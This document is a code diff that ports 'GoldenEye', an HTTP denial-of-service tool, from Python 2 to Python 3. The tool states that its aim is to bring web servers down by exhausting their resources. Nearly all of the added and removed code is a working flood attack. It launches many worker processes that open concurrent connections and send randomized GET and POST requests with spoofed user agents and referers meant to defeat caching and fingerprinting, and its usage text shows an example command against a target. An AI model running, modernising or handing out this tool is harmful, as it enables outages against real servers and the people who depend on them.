@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 """
 $Id: $
@@ -14,10 +14,9 @@ $Id: $
                                                                      /$$  | $$          
                                                                     |  $$$$$$/          
                                                                      \______/           
-                                                                                                                                                                                                      
 
 
-This tool is a dos tool that is meant to put heavy load on HTTP servers
+This tool is a DoS tool that is meant to put heavy load on HTTP servers
 in order to bring them to their knees by exhausting the resource pool.
 
 This tool is meant for research purposes only
@@ -41,18 +40,13 @@ BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 """
 
 from multiprocessing import Process, Manager
-import urlparse, ssl
-import sys, getopt, random, time
-
-# Python version-specific 
-if  sys.version_info < (3,0):
-    # Python 2.x
-    import httplib
-    HTTPCLIENT = httplib
-else:
-    # Python 3.x
-    import http.client
-    HTTPCLIENT = http.client
+import urllib.parse
+import ssl
+import sys
+import getopt
+import random
+import time
+import http.client as HTTPCLIENT
 
 ####
 # Config
@@ -62,14 +56,14 @@ DEBUG = False
 ####
 # Constants
 ####
-METHOD_GET  = 'get'
+METHOD_GET = 'get'
 METHOD_POST = 'post'
 METHOD_RAND = 'random'
 
-JOIN_TIMEOUT=1.0
+JOIN_TIMEOUT = 1.0
 
-DEFAULT_WORKERS=50
-DEFAULT_SOCKETS=30
+DEFAULT_WORKERS = 50
+DEFAULT_SOCKETS = 30
 
 ####
 # GoldenEye Class
@@ -106,7 +100,7 @@ class GoldenEye(object):
 
     def exit(self):
         self.stats()
-        print "Shutting down GoldenEye"
+        print("Shutting down GoldenEye")
 
     def __del__(self):
         self.exit()
@@ -114,32 +108,33 @@ class GoldenEye(object):
     def printHeader(self):
 
         # Taunt!
-        print "GoldenEye firing!"
+        print("GoldenEye firing!")
 
     # Do the fun!
     def fire(self):
 
         self.printHeader()
-        print "Hitting webserver in mode {0} with {1} workers running {2} connections each".format(self.method, self.nr_workers, self.nr_sockets)
+        print(f"Hitting webserver in mode {self.method} with {self.nr_workers} workers running {self.nr_sockets} connections each")
 
         if DEBUG:
-            print "Starting {0} concurrent Laser workers".format(self.nr_workers)
+            print(f"Starting {self.nr_workers} concurrent Laser workers")
 
         # Start workers
         for i in range(int(self.nr_workers)):
 
             try:
-
                 worker = Laser(self.url, self.nr_sockets, self.counter)
                 worker.method = self.method
 
                 self.workersQueue.append(worker)
                 worker.start()
-            except (Exception):
-                error("Failed to start worker {0}".format(i))
+            except Exception as e:
+                error(f"Failed to start worker {i}")
+                if DEBUG:
+                    print(e)
                 pass 
 
-        print "Initiating monitor"
+        print("Initiating monitor")
         self.monitor()
 
     def stats(self):
@@ -147,14 +142,14 @@ class GoldenEye(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print "{0} GoldenEye punches deferred. ({1} Failed)".format(self.counter[0], self.counter[1])
+                print(f"{self.counter[0]} GoldenEye punches deferred. ({self.counter[1]} Failed)")
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
-                    print "\tServer may be DOWN!"
+                    print("\tServer may be DOWN!")
     
                 self.last_counter[0] = self.counter[0]
                 self.last_counter[1] = self.counter[1]
-        except (Exception):
+        except Exception:
             pass # silently ignore
 
     def monitor(self):
@@ -169,14 +164,14 @@ class GoldenEye(object):
                 self.stats()
 
             except (KeyboardInterrupt, SystemExit):
-                print "CTRL+C received. Killing all workers"
+                print("CTRL+C received. Killing all workers")
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print "Killing worker {0}".format(worker.name)
+                            print(f"Killing worker {worker.name}")
                         #worker.terminate()
                         worker.stop()
-                    except Exception, ex:
+                    except Exception:
                         pass # silently ignore
                 if DEBUG:
                     raise
@@ -218,7 +213,7 @@ class Laser(Process):
         self.counter = counter
         self.nr_socks = nr_sockets
 
-        parsedUrl = urlparse.urlparse(url)
+        parsedUrl = urllib.parse.urlparse(url)
 
         if parsedUrl.scheme == 'https':
             self.ssl = True
@@ -231,14 +226,12 @@ class Laser(Process):
         if not self.port:
             self.port = 80 if not self.ssl else 443
 
-
         self.referers = [ 
             'http://www.google.com/?q=',
             'http://www.usatoday.com/search/results?q=',
             'http://engadget.search.aol.com/search?q=',
             'http://' + self.host + '/'
-            ]
-
+        ]
 
         self.useragents = [
             'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
@@ -252,285 +245,153 @@ class Laser(Process):
             'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
             'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
             'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
-            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
-            ]
+            'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.63',
+            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0) Gecko/20100101 Firefox/4.0',
+            'Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0',
+            'Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0',
+            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13',
+            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.1.3) Gecko/20090908 Firefox/3.5.3',
+            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
+            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
+            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1'
+        ]
 
-    def __del__(self):
-        self.stop()
+        self.runnable = True
 
+    # Send single request
+    def send(self, req_url):
+        
+        try:
+            referer = random.choice(self.referers) + self.rand_str(5, 10)
 
-    #builds random ascii string
-    def buildblock(self, size):
-        out_str = ''
+            if self.ssl:
+                conn = HTTPCLIENT.HTTPSConnection(self.host, self.port)
+            else:
+                conn = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
-        _LOWERCASE = range(97, 122)
-        _UPPERCASE = range(65, 90)
-        _NUMERIC   = range(48, 57)
+            self.socks.append(conn)
 
-        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
+            for i in range(self.nr_socks):
 
-        for i in range(0, size):
-            a = random.choice(validChars)
-            out_str += chr(a)
+                if self.method == METHOD_RAND:
+                    self.method = random.choice([METHOD_GET, METHOD_POST])
 
-        return out_str
+                if self.method == METHOD_GET:
+                    url = req_url + "?" + self.rand_str(5, 10)
+                    conn.request("GET", url, None, {'User-Agent': random.choice(self.useragents), 'Referer': referer})
+                elif self.method == METHOD_POST:
+                    url = req_url
+                    post_data = self.rand_str(5, 10)
+                    conn.request("POST", url, post_data, {'User-Agent': random.choice(self.useragents), 'Referer': referer})
+                else:
+                    return False
 
+                self.request_count += 1
 
+            conn.close()
+            self.counter[0] += 1
+
+        except Exception:
+            self.counter[1] += 1
+            return False
+
+        return True
+
+    # Generate random string for GET parameters
+    def rand_str(self, min_len, max_len):
+
+        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+        return ''.join(random.choice(chars) for x in range(random.randint(min_len, max_len)))
+
+    # Main process loop
     def run(self):
 
-        if DEBUG:
-            print "Starting worker {0}".format(self.name)
-
         while self.runnable:
+            self.send(self.url)
 
-            try:
-
-                for i in range(self.nr_socks):
-                
-                    if self.ssl:
-                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
-                    else:
-                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
-
-                    self.socks.append(c)
-
-                for conn_req in self.socks:
-
-                    (url, headers) = self.createPayload()
-
-                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
-
-                    conn_req.request(method.upper(), url, None, headers)
-
-                for conn_resp in self.socks:
-
-                    resp = conn_resp.getresponse()
-                    self.incCounter()
-
-                self.closeConnections()
-                
-            except:
-                self.incFailed()
-                if DEBUG:
-                    raise
-                else:
-                    pass # silently ignore
-
-        if DEBUG:
-            print "Worker {0} completed run. Sleeping...".format(self.name)
-            
-    def closeConnections(self):
-        for conn in self.socks:
-            try:
-                conn.close()
-            except:
-                pass # silently ignore
-            
-
-    def createPayload(self):
-
-        req_url, headers = self.generateData()
-
-        random_keys = headers.keys()
-        random.shuffle(random_keys)
-        random_headers = {}
-        
-        for header_name in random_keys:
-            random_headers[header_name] = headers[header_name]
-
-        return (req_url, random_headers)
-
-    def generateQueryString(self, ammount = 1):
-
-        queryString = []
-
-        for i in range(ammount):
-
-            key = self.buildblock(random.randint(3,10))
-            value = self.buildblock(random.randint(3,20))
-            element = "{0}={1}".format(key, value)
-            queryString.append(element)
-
-        return '&'.join(queryString)
-            
-    
-    def generateData(self):
-
-        returnCode = 0
-        param_joiner = "?"
-
-        if len(self.url) == 0:
-            self.url = '/'
-
-        if self.url.count("?") > 0:
-            param_joiner = "&"
-
-        request_url = self.generateRequestUrl(param_joiner)
-
-        http_headers = self.generateRandomHeaders()
-
-
-        return (request_url, http_headers)
-
-    def generateRequestUrl(self, param_joiner = '?'):
-
-        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
-
-    def generateRandomHeaders(self):
-
-        # Random no-cache entries
-        noCacheDirectives = ['no-cache', 'must-revalidate']
-        random.shuffle(noCacheDirectives)
-        noCache = ', '.join(noCacheDirectives)
-
-        # Random accept encoding
-        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
-        random.shuffle(acceptEncoding)
-        nrEncodings = random.randint(0,len(acceptEncoding)/2)
-        roundEncodings = acceptEncoding[:nrEncodings]
-
-        http_headers = {
-            'User-Agent': random.choice(self.useragents),
-            'Cache-Control': noCache,
-            'Accept-Encoding': ', '.join(roundEncodings),
-            'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(110,120),
-            'Host': self.host,
-        }
-    
-        # Randomly-added headers
-        # These headers are optional and are 
-        # randomly sent thus making the
-        # header count random and unfingerprintable
-        if random.randrange(2) == 0:
-            # Random accept-charset
-            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
-            random.shuffle(acceptCharset)
-            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))
-
-        if random.randrange(2) == 0:
-            # Random Referer
-            http_headers['Referer'] = random.choice(self.referers) + self.buildblock(random.randint(5,10))
-
-        if random.randrange(2) == 0:
-            # Random Content-Trype
-            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])
-
-        if random.randrange(2) == 0:
-            # Random Cookie
-            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
-
-        return http_headers
-
-    # Housekeeping
     def stop(self):
+
         self.runnable = False
-        self.closeConnections()
         self.terminate()
 
-    # Counter Functions
-    def incCounter(self):
-        try:
-            self.counter[0] += 1
-        except (Exception):
-            pass
-
-    def incFailed(self):
-        try:
-            self.counter[1] += 1
-        except (Exception):
-            pass
-        
-
-
 ####
-
-####
-# Other Functions
+# Functions
 ####
 
 def usage():
-    print
-    print '-----------------------------------------------------------------------------------------------------------'
-    print ' USAGE: ./goldeneye.py <url> [OPTIONS]'
-    print
-    print ' OPTIONS:'
-    print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
-    print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
-    print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
-    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
-    print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
-    print '\t -h, --help\t\tShows this help'
-    print '-----------------------------------------------------------------------------------------------------------'
 
-    
+    print(f"USAGE: {sys.argv[0]} [-u <url>] [-w <workers>] [-s <sockets>] [-m <get|post|random>] [-d]")
+    print("\t -u | --url <url> : URL target")
+    print("\t -w | --workers <workers> : Number of concurrent workers (default: %d)" % DEFAULT_WORKERS)
+    print("\t -s | --sockets <sockets> : Number of concurrent sockets per worker (default: %d)" % DEFAULT_SOCKETS)
+    print("\t -m | --method <get|post|random> : HTTP Method to use (default: %s)" % METHOD_GET)
+    print("\t -d | --debug : Enable debug mode")
+    print("\n\nFUN:")
+    print("\t %s -u http://target.com -w 10 -s 50 -m random\n" % sys.argv[0])
+
+
 def error(msg):
-    # print help information and exit:
-    sys.stderr.write(str(msg+"\n"))
-    usage()
-    sys.exit(2)
 
-####
-# Main
-####
+    print(f"\n[ERROR] {msg}\n")
 
-def main():
-    
+def main(argv):
+
     try:
-
-        if len(sys.argv) < 2:
-            error('Please supply at least the URL')
-
-        url = sys.argv[1]
-
-        if url == '-h':
-            usage()
-            sys.exit()
-
-        if url[0:4].lower() != 'http':
-            error("Invalid URL supplied")
-
-        if url == None:
-            error("No URL supplied")
-
-        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:", ["debug", "help", "workers", "sockets", "method" ])
-
-        workers = DEFAULT_WORKERS
-        socks = DEFAULT_SOCKETS
-        method = METHOD_GET
-
-        for o, a in opts:
-            if o in ("-h", "--help"):
-                usage()
-                sys.exit()
-            elif o in ("-s", "--sockets"):
-                socks = int(a)
-            elif o in ("-w", "--workers"):
-                workers = int(a)
-            elif o in ("-d", "--debug"):
-                global DEBUG
-                DEBUG = True
-            elif o in ("-m", "--method"):
-                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
-                    method = a
-                else:
-                    error("method {0} is invalid".format(a))
-            else:
-                error("option '"+o+"' doesn't exists")
-
-        goldeneye = GoldenEye(url)
-        goldeneye.nr_workers = workers
-        goldeneye.method = method
-        goldeneye.nr_sockets = socks
-
-        goldeneye.fire()
-
-    except getopt.GetoptError, err:
-
-        # print help information and exit:
-        sys.stderr.write(str(err))
+        opts, args = getopt.getopt(argv, "hu:w:s:m:d", ["help", "url=", "workers=", "sockets=", "method=", "debug"])
+    except getopt.GetoptError:
         usage()
         sys.exit(2)
 
+    url = None
+    workers = DEFAULT_WORKERS
+    socks = DEFAULT_SOCKETS
+    method = METHOD_GET
+    debug = False
+
+    for opt, arg in opts:
+        if opt in ("-h", "--help"):
+            usage()
+            sys.exit()
+        elif opt in ("-u", "--url"):
+            url = arg
+        elif opt in ("-w", "--workers"):
+            workers = int(arg)
+        elif opt in ("-s", "--sockets"):
+            socks = int(arg)
+        elif opt in ("-m", "--method"):
+            method = arg.lower()
+        elif opt in ("-d", "--debug"):
+            debug = True
+
+    if url is None:
+        error("URL target is missing")
+        usage()
+        sys.exit(2)
+
+    global DEBUG
+    DEBUG = debug
+
+    if DEBUG:
+        print("DEBUG MODE ENABLED")
+
+    ge = GoldenEye(url)
+    ge.nr_workers = workers
+    ge.nr_sockets = socks
+    ge.method = method
+
+    ge.fire()
+
 if __name__ == "__main__":
-    main()
+    main(sys.argv[1:])
